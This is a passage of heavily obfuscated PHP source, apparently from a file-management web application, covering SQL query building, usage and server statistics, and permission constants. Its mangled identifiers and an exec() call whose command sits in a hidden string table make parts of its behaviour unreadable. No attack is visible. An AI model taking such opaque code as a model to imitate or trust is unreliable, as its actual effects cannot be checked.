$…‰üç‘š[$êªñï©Ñ[359]]; $™àÁËêŸ = $êªñï©Ñ[1199] . $this->parseTable($…‰üç‘š[$êªñï©Ñ[357]]) . $this->parseWhere(!empty($…‰üç‘š[$êªñï©Ñ[353]]) ? $…‰üç‘š[$êªñï©Ñ[353]] : $êªñï©Ñ[12]) . $this->parseOrder(!empty($…‰üç‘š[$êªñï©Ñ[441]]) ? $…‰üç‘š[$êªñï©Ñ[441]] : $êªñï©Ñ[12]) . $this->parseLimit(!empty($…‰üç‘š[$êªñï©Ñ[368]]) ? $…‰üç‘š[$êªñï©Ñ[368]] : $êªñï©Ñ[12]) . $this->parseLock(isset($…‰üç‘š[$êªñï©Ñ[991]]) ? $…‰üç‘š[$êªñï©Ñ[991]] : !1) . $this->parseComment(!empty($…‰üç‘š[$êªñï©Ñ[429]]) ? $…‰üç‘š[$êªñï©Ñ[429]] : $êªñï©Ñ[12]); return $this->execute($™àÁËêŸ, $this->parseBind(!empty($…‰üç‘š[$êªñï©Ñ[361]]) ? $…‰üç‘š[$êªñï©Ñ[361]] : array())); } public function select($‡£¼‘ş­ = array()) { $ç‘õÎ· =& $_SERVER[¹Éµ„ºå]; $this->model = $‡£¼‘ş­[$ç‘õÎ·[359]]; $¹¦—çÜŒ = $this->buildSelectSql($‡£¼‘ş­); $á÷°È¸ = isset($‡£¼‘ş­[$ç‘õÎ·[424]]) ? $‡£¼‘ş­[$ç‘õÎ·[424]] : !1; if ($á÷°È¸) { $Ğ“ãß¡» = is_string($á÷°È¸[$ç‘õÎ·[95]]) ? $á÷°È¸[$ç‘õÎ·[95]] : $ç‘õÎ·[1200] . md5($¹¦—çÜŒ); $¯Ãğóåî = think_cache($Ğ“ãß¡», $ç‘õÎ·[12], $á÷°È¸); if (!1 !== $¯Ãğóåî) { return $¯Ãğóåî; } } $óºï°ëí = $this->query($¹¦—çÜŒ, $this->parseBind(!empty($‡£¼‘ş­[$ç‘õÎ·[361]]) ? $‡£¼‘ş­[$ç‘õÎ·[361]] : array())); if ($á÷°È¸ && !1 !== $óºï°ëí) { think_cache($Ğ“ãß¡», $óºï°ëí, $á÷°È¸); } return $óºï°ëí; } public function buildSelectSql($×¸¸‡»¼ = array()) { $—›Ñöª³ =& $_SERVER[¹Éµ„ºå]; if (isset($×¸¸‡»¼[$—›Ñöª³[428]])) { if (strpos($×¸¸‡»¼[$—›Ñöª³[428]], $—›Ñöª³[50])) { list($¹ê½‚ø, $Ö˜Ê•º‡) = explode($—›Ñöª³[50], $×¸¸‡»¼[$—›Ñöª³[428]]); } else { $¹ê½‚ø = $×¸¸‡»¼[$—›Ñöª³[428]]; } $¹ê½‚ø = $¹ê½‚ø ? $¹ê½‚ø : 1; $Ö˜Ê•º‡ = isset($Ö˜Ê•º‡) ? $Ö˜Ê•º‡ : (is_numeric($×¸¸‡»¼[$—›Ñöª³[368]]) ? $×¸¸‡»¼[$—›Ñöª³[368]] : 20); $Ö¶ğ±Ê– = $Ö˜Ê•º‡ * ((int) $¹ê½‚ø - 1); $×¸¸‡»¼[$—›Ñöª³[368]] = $Ö¶ğ±Ê– . $—›Ñöª³[50] . $Ö˜Ê•º‡; } if (think_config($—›Ñöª³[1201])) { $ş‘¢öŞ = $—›Ñöª³[1202] . md5(serialize($×¸¸‡»¼)); $¹Õ–Œ¡‡ = think_cache($ş‘¢öŞ); if ($¹Õ–Œ¡‡) { return $¹Õ–Œ¡‡; } } $Æ·ºòÛó = $this->parseSql($this->selectSql, $×¸¸‡»¼); $Æ·ºòÛó .= $this->parseLock(isset($×¸¸‡»¼[$—›Ñöª³[991]]) ? $×¸¸‡»¼[$—›Ñöª³[991]] : !1); if (isset($ş‘¢öŞ)) { think_cache($ş‘¢öŞ, $Æ·ºòÛó); } return $Æ·ºòÛó; } public function parseSql($¯‹Ö…ÚŒ, $á›âÖå = array()) { $‰¤ñ˜ú¶ =& $_SERVER[¹Éµ„ºå]; $¯‹Ö…ÚŒ = str_replace(array($‰¤ñ˜ú¶[1203], $‰¤ñ˜ú¶[1204], $‰¤ñ˜ú¶[1205], $‰¤ñ˜ú¶[1206], $‰¤ñ˜ú¶[1207], $‰¤ñ˜ú¶[1208], $‰¤ñ˜ú¶[1209], $‰¤ñ˜ú¶[1210], $‰¤ñ˜ú¶[1211], $‰¤ñ˜ú¶[1212], $‰¤ñ˜ú¶[1213]), array($this->parseTable("{$á›âÖå[$‰¤ñ˜ú¶[357]]}"), $this->parseDistinct(isset($á›âÖå[$‰¤ñ˜ú¶[1214]]) ? $á›âÖå[$‰¤ñ˜ú¶[1214]] : !1), $this->parseField(!empty($á›âÖå[$‰¤ñ˜ú¶[351]]) ? $á›âÖå[$‰¤ñ˜ú¶[351]] : $‰¤ñ˜ú¶[220]), $this->parseJoin(!empty($á›âÖå[$‰¤ñ˜ú¶[360]]) ? $á›âÖå[$‰¤ñ˜ú¶[360]] : $‰¤ñ˜ú¶[12]), $this->parseWhere(!empty($á›âÖå[$‰¤ñ˜ú¶[353]]) ? $á›âÖå[$‰¤ñ˜ú¶[353]] : $‰¤ñ˜ú¶[12]), $this->parseGroup(!empty($á›âÖå[$‰¤ñ˜ú¶[598]]) ? $á›âÖå[$‰¤ñ˜ú¶[598]] : $‰¤ñ˜ú¶[12]), $this->parseHaving(!empty($á›âÖå[$‰¤ñ˜ú¶[1215]]) ? $á›âÖå[$‰¤ñ˜ú¶[1215]] : $‰¤ñ˜ú¶[12]), $this->parseOrder(!empty($á›âÖå[$‰¤ñ˜ú¶[441]]) ? $á›âÖå[$‰¤ñ˜ú¶[441]] : $‰¤ñ˜ú¶[12]), $this->parseLimit(!empty($á›âÖå[$‰¤ñ˜ú¶[368]]) ? $á›âÖå[$‰¤ñ˜ú¶[368]] : $‰¤ñ˜ú¶[12]), $this->parseUnion(!empty($á›âÖå[$‰¤ñ˜ú¶[422]]) ? $á›âÖå[$‰¤ñ˜ú¶[422]] : $‰¤ñ˜ú¶[12]), $this->parseComment(!empty($á›âÖå[$‰¤ñ˜ú¶[429]]) ? $á›âÖå[$‰¤ñ˜ú¶[429]] : $‰¤ñ˜ú¶[12])), $¯‹Ö…ÚŒ); return $¯‹Ö…ÚŒ; } public function getLastSql($èçõ­û = '') { return $èçõ­û ? $this->modelSql[$èçõ­û] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($úé¹ª„û) { return addslashes($úé¹ª„û); } public function setModel($øŒ²ä„Ç) { $this->model = $øŒ²ä„Ç; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto FÕ”‹ƒö†¥; F©º„Ì§Ò¬: class AnalysisModel extends ModelBaseLight { public function init($·Ã‘Â÷Ë) { $¦‚å‚Î« =& $_SERVER[¹Éµ„ºå]; $Ï¥ÌÜÏÖ = array($¦‚å‚Î«[684] => array($¦‚å‚Î«[33] => $¦‚å‚Î«[2102], $¦‚å‚Î«[351] => array($¦‚å‚Î«[282], $¦‚å‚Î«[857], $¦‚å‚Î«[2103], $¦‚å‚Î«[2104])), $¦‚å‚Î«[2105] => array($¦‚å‚Î«[33] => $¦‚å‚Î«[2106], $¦‚å‚Î«[351] => array($¦‚å‚Î«[282], $¦‚å‚Î«[855], $¦‚å‚Î«[2107], $¦‚å‚Î«[2108], $¦‚å‚Î«[2109]))); if (!isset($Ï¥ÌÜÏÖ[$·Ã‘Â÷Ë])) { return !1; } $this->optionType = $Ï¥ÌÜÏÖ[$·Ã‘Â÷Ë][$¦‚å‚Î«[33]]; $this->field = $Ï¥ÌÜÏÖ[$·Ã‘Â÷Ë][$¦‚å‚Î«[351]]; return !0; } public function listData($¢ì°ŞË÷ = false, $£ú®˜ã = "\155\157\144\x69\x66\171\124\x69\155\145", $âı±‘Í = false) { return parent::listData($¢ì°ŞË÷, $£ú®˜ã, $âı±‘Í); } public function trendList($ü‘¡‡„„) { $Åå£¶‹¨ =& $_SERVER[¹Éµ„ºå]; $ĞàĞ¿¢ = $this->listData(); if ($ĞàĞ¿¢) { $¦õ¨Ûü± = end($ĞàĞ¿¢); $ëîœ¼ = date($Åå£¶‹¨[2110], strtotime($Åå£¶‹¨[2111])); if ($¦õ¨Ûü±[$Åå£¶‹¨[282]] == $ëîœ¼) { return $ĞàĞ¿¢; } $¼³¢ğ”Ú = strtotime($¦õ¨Ûü±[$Åå£¶‹¨[282]]); } if (!isset($¼³¢ğ”Ú)) { $šÑ³±Ÿ“ = $ü‘¡‡„„ == $Åå£¶‹¨[684] ? $Åå£¶‹¨[617] : $Åå£¶‹¨[924]; $¼³¢ğ”Ú = Model($šÑ³±Ÿ“)->min($Åå£¶‹¨[231]); } $âæ÷Îò¯ = $Åå£¶‹¨[2112] . ucfirst($ü‘¡‡„„); $İÍïß = $this->dateList($¼³¢ğ”Ú); foreach ($İÍïß as $ëîœ¼) { $this->{$âæ÷Îò¯}($ëîœ¼); } return $this->listData(); } private function dateList($’ûä®€Ò) { $‹’…‰ô =& $_SERVER[¹Éµ„ºå]; $ ¬ŒÑœ³ = $’ûä®€Ò; $íÜ……Ë = strtotime($‹’…‰ô[2111]); $¶ËÕëÚ = array(); while ($ ¬ŒÑœ³ <= $íÜ……Ë) { $¶ËÕëÚ[] = date($‹’…‰ô[2110], $ ¬ŒÑœ³); $ ¬ŒÑœ³ = strtotime($‹’…‰ô[2113], $ ¬ŒÑœ³); } return $¶ËÕëÚ; } public function _recordUser($œ›ÂéÇ¾ = '') { $å²ö“Ú =& $_SERVER[¹Éµ„ºå]; if (!$œ›ÂéÇ¾) { return 0; } $çÒôì©“ = strtotime(date($å²ö“Ú[2114], strtotime($œ›ÂéÇ¾))); $€‰ÄòÏõ = strtotime(date($å²ö“Ú[2115], strtotime($œ›ÂéÇ¾))); $É»“¢•× = array($å²ö“Ú[231] => array($å²ö“Ú[1170], $€‰ÄòÏõ)); $ĞíÛÀº¢ = Model($å²ö“Ú[617])->where($É»“¢•×)->count($å²ö“Ú[1582]); $É»“¢•×[$å²ö“Ú[231]] = array($å²ö“Ú[408], array($çÒôì©“, $€‰ÄòÏõ)); $É¥àé“¨ = Model($å²ö“Ú[617])->where($É»“¢•×)->count($å²ö“Ú[1582]); $É»“¢•×[$å²ö“Ú[33]] = $å²ö“Ú[2116]; $Êë€€¥ş = Model($å²ö“Ú[2117])->where($É»“¢•×)->count($å²ö“Ú[2118]); $å³²·æÄ = array($å²ö“Ú[282] => $œ›ÂéÇ¾, $å²ö“Ú[857] => (int) $ĞíÛÀº¢, $å²ö“Ú[2103] => (int) $É¥àé“¨, $å²ö“Ú[2104] => (int) $Êë€€¥ş); return $this->insert($å³²·æÄ); } public function _recordStore($ø½¯­Ñ = '') { $ù¬•Ùô¨ =& $_SERVER[¹Éµ„ºå]; if (!$ø½¯­Ñ) { return 0; } $ú¸„—’™ = strtotime(date($ù¬•Ùô¨[2115], strtotime($ø½¯­Ñ))); $ºà–«Šú = array($ù¬•Ùô¨[231] => array($ù¬•Ùô¨[1170], $ú¸„—’™)); $¶ÀÏœ¥İ = Model($ù¬•Ùô¨[560])->where($ºà–«Šú)->sum($ù¬•Ùô¨[79]); $µöÀ£³© = "\x53\105\114\105\x43\x54\40\xa\x20\x20\x20\40\40\40\x20\40\40\40\x20\x20\40\40\40\x20\x53\125\x4d\x28\140\x73\x69\172\145\140\51\x20\101\123\40\x73\x69\172\x65\x54\157\164\x61\154\x2c\12\x20\x20\x20\40\x20\x20\40\x20\x20\x20\40\x20\x20\x20\x20\x20\123\x55\115\x28\x43\x41\123\105\40\127\x48\105\x4e\40\x60\x74\141\162\147\x65\164\x54\x79\x70\145\x60\40\x3d\x20\x31\40\124\x48\x45\x4e\40\140\x73\x69\x7a\x65\x60\40\105\x4c\123\x45\x20\60\40\105\x4e\104\x29\x20\101\x53\x20\163\151\172\x65\125\163\145\x72\54\12\x20\x20\40\x20\40\x20\x20\x20\x20\40\x20\x20\x20\40\40\x20\x53\x55\x4d\x28\103\101\x53\105\x20\x57\110\105\116\40\x60\164\x61\x72\x67\x65\164\124\171\x70\145\140\x20\x3d\x20\x32\x20\x54\110\x45\x4e\x20\x60\x73\151\x7a\145\140\x20\x45\114\123\105\x20\60\40\x45\116\104\51\x20\x41\x53\40\163\151\x7a\x65\x47\162\157\165\x70\12\x20\x20\40\40\40\40\x20\40\x20\40\40\x20\x20\40\x20\x20\x46\x52\117\115\40\x60\151\157\x5f\x73\x6f\165\x72\x63\145\140\40\xa\x20\x20\40\x20\40\x20\40\x20\40\x20\x20\40\40\40\40\40\x57\x48\x45\122\105\40\140\x69\x73\x46\157\154\x64\145\x72\x60\x20\x3d\40\60\x20\x41\116\104\40\140\x63\x72\145\x61\164\145\x54\x69\155\145\x60\40\74\x3d\x20{$ú¸„—’™}"; $ı¹¢“Í’ = Model($ù¬•Ùô¨[924])->query($µöÀ£³©); $ÅæäöÍ = array($ù¬•Ùô¨[282] => $ø½¯­Ñ, $ù¬•Ùô¨[855] => (int) (isset($ı¹¢“Í’[0][$ù¬•Ùô¨[855]]) ? $ı¹¢“Í’[0][$ù¬•Ùô¨[855]] : 0), $ù¬•Ùô¨[2107] => (int) $¶ÀÏœ¥İ, $ù¬•Ùô¨[2108] => (int) (isset($ı¹¢“Í’[0][$ù¬•Ùô¨[2108]]) ? $ı¹¢“Í’[0][$ù¬•Ùô¨[2108]] : 0), $ù¬•Ùô¨[2109] => (int) (isset($ı¹¢“Í’[0][$ù¬•Ùô¨[2109]]) ? $ı¹¢“Í’[0][$ù¬•Ùô¨[2109]] : 0)); return $this->insert($ÅæäöÍ); } public function trend($µ°¨œÓ, $¦Ğ³èÎ–) { $é¤¿÷”À =& $_SERVER[¹Éµ„ºå]; if (!$this->init($µ°¨œÓ)) { return !1; } $òŞÇ»íø = $this->trendList($µ°¨œÓ); if ($òŞÇ»íø && $¦Ğ³èÎ– != $é¤¿÷”À[1938]) { $ò×§Şùú = $òŞÇ»íø[0][$é¤¿÷”À[282]]; $Ïò Ò¢ = $this->validDate($¦Ğ³èÎ–, $ò×§Şùú); $°‡Ôê¥ = array(); $Î¶™Êé» = array_to_keyvalue($òŞÇ»íø, $é¤¿÷”À[282]); foreach ($Ïò Ò¢ as $¥·¯†ÖĞ) { if (isset($Î¶™Êé»[$¥·¯†ÖĞ])) { $ˆÃÁå‚Ò = $Î¶™Êé»[$¥·¯†ÖĞ]; } else { $ˆÃÁå‚Ò = end($òŞÇ»íø); $ˆÃÁå‚Ò[$é¤¿÷”À[282]] = $¥·¯†ÖĞ; if ($µ°¨œÓ == $é¤¿÷”À[684]) { $ˆÃÁå‚Ò[$é¤¿÷”À[2103]] = $ˆÃÁå‚Ò[$é¤¿÷”À[2104]] = 0; } } $°‡Ôê¥[] = $ˆÃÁå‚Ò; } $òŞÇ»íø = $°‡Ôê¥; } $ôé’œĞá = array($é¤¿÷”À[684] => array($é¤¿÷”À[857] => LNG($é¤¿÷”À[2119]), $é¤¿÷”À[2103] => LNG($é¤¿÷”À[2120]), $é¤¿÷”À[2104] => LNG($é¤¿÷”À[2121])), $é¤¿÷”À[2105] => array($é¤¿÷”À[855] => LNG($é¤¿÷”À[2122]), $é¤¿÷”À[2107] => LNG($é¤¿÷”À[2123]), $é¤¿÷”À[2108] => LNG($é¤¿÷”À[2124]), $é¤¿÷”À[2109] => LNG($é¤¿÷”À[2125]))); $õÑæğø´ = array($é¤¿÷”À[684] => $é¤¿÷”À[941], $é¤¿÷”À[2105] => $é¤¿÷”À[79]); if (empty($òŞÇ»íø)) { $¥·¯†ÖĞ = date($é¤¿÷”À[2110], strtotime($é¤¿÷”À[2111])); $«µóµ = array($é¤¿÷”À[282] => $¥·¯†ÖĞ); foreach ($ôé’œĞá[$µ°¨œÓ] as $è´‰÷· => $¶Õíù±Š) { $«µóµ[$è´‰÷·] = 0; } $òŞÇ»íø[] = $«µóµ; } $¬Ô¥´Á” = array(); foreach ($òŞÇ»íø as $¶Õíù±Š) { if ($µ°¨œÓ == $é¤¿÷”À[2105] && $¶Õíù±Š[$é¤¿÷”À[2107]] > $¶Õíù±Š[$é¤¿÷”À[855]]) { $¶Õíù±Š[$é¤¿÷”À[2107]] = $¶Õíù±Š[$é¤¿÷”À[855]]; } foreach ($ôé’œĞá[$µ°¨œÓ] as $è´‰÷· => $ıÜœ˜ìÕ) { $ˆÃÁå‚Ò = array($é¤¿÷”À[282] => $¶Õíù±Š[$é¤¿÷”À[282]], $é¤¿÷”À[1854] => $ıÜœ˜ìÕ); $ˆÃÁå‚Ò[$õÑæğø´[$µ°¨œÓ]] = isset($¶Õíù±Š[$è´‰÷·]) ? $¶Õíù±Š[$è´‰÷·] : 0; $¬Ô¥´Á”[] = $ˆÃÁå‚Ò; } } return $¬Ô¥´Á”; } public function validDate($ËÊ¶¿Õ„, $Ê™¡ŠÉ) { $÷¼˜”Í» =& $_SERVER[¹Éµ„ºå]; $‹„¾Õ¬æ = date($÷¼˜”Í»[2110], strtotime($÷¼˜”Í»[2111])); $ı¤Ôß = array($‹„¾Õ¬æ); switch ($ËÊ¶¿Õ„) { case $÷¼˜”Í»[1945]: $Å¥ÇÍÅ— = mktime(0, 0, 0, date($÷¼˜”Í»[2126]), date($÷¼˜”Í»[1649]) - date($÷¼˜”Í»[1735]) + 7 - 7, date($÷¼˜”Í»[2127])); $µ„Ø»ô“ = 0; do { $®ğÇæ‘ğ = date($÷¼˜”Í»[2110], $Å¥ÇÍÅ— - 3600 * 24 * 7 * $µ„Ø»ô“); $ı¤Ôß[] = $®ğÇæ‘ğ; $µ„Ø»ô“++; } while ($Ê™¡ŠÉ < $®ğÇæ‘ğ); break; case $÷¼˜”Í»[1943]: $µ„Ø»ô“ = 1; do { $Î¯Æ¸ƒ = date($÷¼˜”Í»[2128], strtotime("\55\40{$µ„Ø»ô“}\x20\155\x6f\156\x74\x68\163")); $ı¤Ôß[] = $Î¯Æ¸ƒ; $µ„Ø»ô“++; } while ($Ê™¡ŠÉ < $Î¯Æ¸ƒ); break; case $÷¼˜”Í»[2129]: $¹¨î›õÑ = (int) date($÷¼˜”Í»[2127], strtotime($Ê™¡ŠÉ)); $ñŒ˜òã = (int) date($÷¼˜”Í»[2127]); if ($¹¨î›õÑ >= $ñŒ˜òã) { break; } for ($¹¨î›õÑ; $¹¨î›õÑ < $ñŒ˜òã; $¹¨î›õÑ++) { $ı¤Ôß[] = $¹¨î›õÑ . $÷¼˜”Í»[2130]; } break; default: break; } if ($Ê™¡ŠÉ > end($ı¤Ôß)) { array_pop($ı¤Ôß); } sort($ı¤Ôß); return $ı¤Ôß; } public function listTable($£¹£İ»á) { $Ó´Âá°Ê = ucfirst($£¹£İ»á); return Model($Ó´Âá°Ê)->listData(); } public function option($œçß¿±Â) { return call_user_func_array(array($this, $_SERVER[¹Éµ„ºå][2131] . ucfirst($œçß¿±Â)), array()); } private function optionUser() { $ğ½¿ûË‰ =& $_SERVER[¹Éµ„ºå]; $Ã×¤¾Úö = Model($ğ½¿ûË‰[617])->count($ğ½¿ûË‰[1582]); $º¸³…”Ï = Model($ğ½¿ûË‰[617])->where($ğ½¿ûË‰[2132])->count($ğ½¿ûË‰[1582]); $ ß½ÎØô = intval($GLOBALS[$ğ½¿ûË‰[6]][$ğ½¿ûË‰[424]][$ğ½¿ûË‰[1912]]) / 3600; $Ì’·ãÀĞ = strtotime("\55{$ ß½ÎØô}\40\150\157\165\x72\163"); $°¦Å‡—ô = strtotime(date($ğ½¿ûË‰[2114])); if ($Ì’·ãÀĞ < $°¦Å‡—ô) { $Ì’·ãÀĞ = $°¦Å‡—ô; } $ÃãµÛÂ» = array($ğ½¿ûË‰[2133] => array($ğ½¿ûË‰[1171], $Ì’·ãÀĞ)); $ã˜ìü¤ = (int) Model($ğ½¿ûË‰[617])->where($ÃãµÛÂ»)->count($ğ½¿ûË‰[1582]); if (!$ã˜ìü¤) { $ã˜ìü¤ = 1; } $ÃãµÛÂ» = array($ğ½¿ûË‰[2133] => array($ğ½¿ûË‰[1171], $°¦Å‡—ô)); $ù‡±”–ß = Model($ğ½¿ûË‰[617])->where($ÃãµÛÂ»)->count($ğ½¿ûË‰[1582]); return array($ğ½¿ûË‰[850] => (int) $Ã×¤¾Úö, $ğ½¿ûË‰[2134] => (int) ($Ã×¤¾Úö - $º¸³…”Ï), $ğ½¿ûË‰[2135] => (int) $º¸³…”Ï, $ğ½¿ûË‰[2136] => (int) $ù‡±”–ß, $ğ½¿ûË‰[2137] => $ã˜ìü¤); } private function optionFile() { $ÆÕÕß«³ =& $_SERVER[¹Éµ„ºå]; $†Óğ—£ò = $this->sourceSize(); $¿ÎšÌÅÆ = $†Óğ—£ò[$ÆÕÕß«³[79]]; $¾Şú¶ = $†Óğ—£ò[$ÆÕÕß«³[2107]]; $ë˜Ó¬ª = array($ÆÕÕß«³[500] => 0); $ê¨ê‹İâ = Model($ÆÕÕß«³[924])->where($ë˜Ó¬ª)->count(); $ë˜Ó¬ª[$ÆÕÕß«³[231]] = array($ÆÕÕß«³[1171], strtotime(date($ÆÕÕß«³[2114]))); $•áï²´ = Model($ÆÕÕß«³[924])->where($ë˜Ó¬ª)->field(array($ÆÕÕß«³[940] => $ÆÕÕß«³[941], $ÆÕÕß«³[942] => $ÆÕÕß«³[79]))->find(); $®œ¬½Êé = array($ÆÕÕß«³[855] => $¿ÎšÌÅÆ, $ÆÕÕß«³[2107] => $¾Şú¶, $ÆÕÕß«³[2138] => $¿ÎšÌÅÆ - $¾Şú¶, $ÆÕÕß«³[2139] => (int) (isset($•áï²´[$ÆÕÕß«³[79]]) ? $•áï²´[$ÆÕÕß«³[79]] : 0), $ÆÕÕß«³[857] => (int) $ê¨ê‹İâ, $ÆÕÕß«³[2140] => (int) (isset($•áï²´[$ÆÕÕß«³[941]]) ? $•áï²´[$ÆÕÕß«³[941]] : 0)); if ($®œ¬½Êé[$ÆÕÕß«³[2138]] < 0) { $®œ¬½Êé[$ÆÕÕß«³[2138]] = 0; } return $®œ¬½Êé; } private function optionAccess() { $ıä€„ã£ =& $_SERVER[¹Éµ„ºå]; return array($ıä€„ã£[850] => $this->typeLogCnt(), $ıä€„ã£[107] => $this->typeLogCnt($ıä€„ã£[107]), $ıä€„ã£[539] => $this->typeLogCnt($ıä€„ã£[539]), $ıä€„ã£[1323] => $this->typeLogCnt($ıä€„ã£[1323]), $ıä€„ã£[1551] => $this->typeLogCnt($ıä€„ã£[1551]), $ıä€„ã£[684] => $this->typeLogCnt($ıä€„ã£[12], $ıä€„ã£[2118])); } private function typeLogCnt($ÑÙÈªœ¢ = '', $ùè¢ÏŒÏ = "\151\144") { $Ù¾¹Š±˜ =& $_SERVER[¹Éµ„ºå]; $èÇÉ¹¤ = array($Ù¾¹Š±˜[107] => array($Ù¾¹Š±˜[2141], $Ù¾¹Š±˜[2142]), $Ù¾¹Š±˜[539] => array($Ù¾¹Š±˜[2143], $Ù¾¹Š±˜[2144]), $Ù¾¹Š±˜[1323] => array($Ù¾¹Š±˜[2145], $Ù¾¹Š±˜[2146], $Ù¾¹Š±˜[2147]), $Ù¾¹Š±˜[1551] => array($Ù¾¹Š±˜[2148], $Ù¾¹Š±˜[2149]), $Ù¾¹Š±˜[1552] => array($Ù¾¹Š±˜[2150], $Ù¾¹Š±˜[2151], $Ù¾¹Š±˜[2152])); $ê¸šëğİ = strtotime(date($Ù¾¹Š±˜[2114])); $·–Ü˜Ãë = array($Ù¾¹Š±˜[231] => array($Ù¾¹Š±˜[1171], $ê¸šëğİ)); if ($ÑÙÈªœ¢) { $·–Ü˜Ãë[$Ù¾¹Š±˜[33]] = array($Ù¾¹Š±˜[7], $èÇÉ¹¤[$ÑÙÈªœ¢]); } $˜üë“†Ú = Model($Ù¾¹Š±˜[2117])->where($·–Ü˜Ãë)->count($ùè¢ÏŒÏ); return (int) $˜üë“†Ú; } private function optionServer() { $ùˆÛìŸö =& $_SERVER[¹Éµ„ºå]; $öÏ–ò±¨ = $this->diskDriver(); $óùâ¢á— = KodIO::defaultDriver(); $¾²ïË´‘ = array($ùˆÛìŸö[917] => $óùâ¢á—[$ùˆÛìŸö[487]]); $·È¸Ó¢¢ = Model($ùˆÛìŸö[560])->where($¾²ïË´‘)->sum($ùˆÛìŸö[79]); $¡’¨ÏÁå = explode($ùˆÛìŸö[53], $_SERVER[$ùˆÛìŸö[144]]); $ùúÓ§¡¿ = $¡’¨ÏÁå[0]; $ÚÍ²å´¶ = $GLOBALS[$ùˆÛìŸö[6]][$ùˆÛìŸö[21]]; $ÕĞü˜å» = $ÚÍ²å´¶[$ùˆÛìŸö[1133]]; if ($ÕĞü˜å» == $ùˆÛìŸö[1121]) { $í§¾ÌØä = explode($ùˆÛìŸö[1462], $ÚÍ²å´¶[$ùˆÛìŸö[1132]]); $ÕĞü˜å» = $í§¾ÌØä[0]; } if ($ÕĞü˜å» == $ùˆÛìŸö[1069] || $ÕĞü˜å» == $ùˆÛìŸö[892]) { $û™¯ïßÕ = Model()->db()->query($ùˆÛìŸö[2153]); $›­¦ãüà = $û™¯ïßÕ[0] && isset($û™¯ïßÕ[0][$ùˆÛìŸö[1853]]) ? $û™¯ïßÕ[0][$ùˆÛìŸö[1853]] : 0; $ÕĞü˜å» = $ùˆÛìŸö[2154] . ($›­¦ãüà ? $ùˆÛìŸö[8] . $›­¦ãüà : $ùˆÛìŸö[12]); } $ÊÙà›²ó = $GLOBALS[$ùˆÛìŸö[6]][$ùˆÛìŸö[424]][$ùˆÛìŸö[971]]; return array($ùˆÛìŸö[2155] => $öÏ–ò±¨ ? $öÏ–ò±¨[$ùˆÛìŸö[2156]] : 0, $ùˆÛìŸö[2157] => $öÏ–ò±¨ ? $öÏ–ò±¨[$ùˆÛìŸö[2158]] : 0, $ùˆÛìŸö[2159] => (int) $óùâ¢á—[$ùˆÛìŸö[2156]] * 1024 * 1024 * 1024, $ùˆÛìŸö[2160] => (int) $·È¸Ó¢¢, $ùˆÛìŸö[2161] => ucfirst($ùúÓ§¡¿), $ùˆÛìŸö[2162] => $ùˆÛìŸö[2163] . PHP_VERSION, $ùˆÛìŸö[2164] => phpBuild64() ? 64 : 32, $ùˆÛìŸö[849] => str_replace($ùˆÛìŸö[1297], $ùˆÛìŸö[1149], $ÕĞü˜å»), $ùˆÛìŸö[424] => ucfirst($ÊÙà›²ó), $ùˆÛìŸö[32] => $_SERVER[$ùˆÛìŸö[2165]]); } private function diskDriver() { $ªç›Âş =& $_SERVER[¹Éµ„ºå]; $¤Åºè›û = $ªç›Âş[8]; $µÛÅğ´ = $GLOBALS[$ªç›Âş[6]][$ªç›Âş[1486]] == $ªç›Âş[1487]; if ($µÛÅğ´) { $¤Åºè›û = $ªç›Âş[2166]; if (function_exists($ªç›Âş[2167])) { exec($ªç›Âş[2168], $Â‰–ãçá); $¤Åºè›û = $Â‰–ãçá[1] . $ªç›Âş[8]; } } if (!file_exists($¤Åºè›û)) { return; } if (!function_exists($ªç›Âş[2169])) { return; } $óÒÁì¢³ = @disk_total_space($¤Åºè›û); $‡Å°¤½ğ = $óÒÁì¢³ - @disk_free_space($¤Åºè›û); return array($ªç›Âş[2156] => $óÒÁì¢³, $ªç›Âş[2158] => $‡Å°¤½ğ); } public function fileChart($åéõü‘«) { $¤ŸÏ¥¼ü =& $_SERVER[¹Éµ„ºå]; if (isset($åéõü‘«[$¤ŸÏ¥¼ü[1582]])) { return Model($¤ŸÏ¥¼ü[924])->userFileTypeProfile($åéõü‘«[$¤ŸÏ¥¼ü[1582]]); } if (isset($åéõü‘«[$¤ŸÏ¥¼ü[1484]])) { return Model($¤ŸÏ¥¼ü[924])->groupFileTypeProfile($åéõü‘«[$¤ŸÏ¥¼ü[1484]]); } $ĞÀ‘Õ = $this->sourceSize(); $Õ›¬‰¢ = $¤ŸÏ¥¼ü[2170]; $Í•ëÇª½ = Model($¤ŸÏ¥¼ü[924])->query($Õ›¬‰¢); return array($¤ŸÏ¥¼ü[855] => $ĞÀ‘Õ[$¤ŸÏ¥¼ü[79]], $¤ŸÏ¥¼ü[2107] => $ĞÀ‘Õ[$¤ŸÏ¥¼ü[2107]], $¤ŸÏ¥¼ü[2108] => (int) (isset($Í•ëÇª½[0][$¤ŸÏ¥¼ü[2108]]) ? $Í•ëÇª½[0][$¤ŸÏ¥¼ü[2108]] : 0), $¤ŸÏ¥¼ü[2109] => (int) (isset($Í•ëÇª½[0][$¤ŸÏ¥¼ü[2109]]) ? $Í•ëÇª½[0][$¤ŸÏ¥¼ü[2109]] : 0)); } private function sourceSize() { $õíÀÔĞ =& $_SERVER[¹Éµ„ºå]; $ú¢—¤”¯ = Model($õíÀÔĞ[924])->where(array($õíÀÔĞ[500] => 0))->sum($õíÀÔĞ[79]); $ó›é¨Ïï = Model($õíÀÔĞ[2171])->sum($õíÀÔĞ[79]); $ß´†Ù©  = Model($õíÀÔĞ[560])->sum($õíÀÔĞ[79]); return array($õíÀÔĞ[79] => (int) $ú¢—¤”¯ + (int) $ó›é¨Ïï, $õíÀÔĞ[2107] => (int) $ß´†Ù© ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $´Ê¥×Ñ =& 